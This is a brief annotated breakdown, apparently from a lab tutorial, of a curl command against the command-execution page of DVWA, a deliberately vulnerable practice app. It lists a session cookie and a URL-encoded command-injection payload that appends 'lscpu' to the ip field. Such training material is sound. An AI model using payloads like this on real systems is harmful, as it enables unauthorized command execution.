  • -vv —–very verbose
  • -b —-set-cookie
  • “security=low; PHPSESSID=ungj5i2cirq9jvfrsjju273l53” —- cookie
  • –data —— includes url-encoded injection payload
  • “ip=192.168.10.123%26%26lscpu&Submit=Submit” —— payload
  • http://192.168.10.123/dvwa/vulnerabilities/exec/
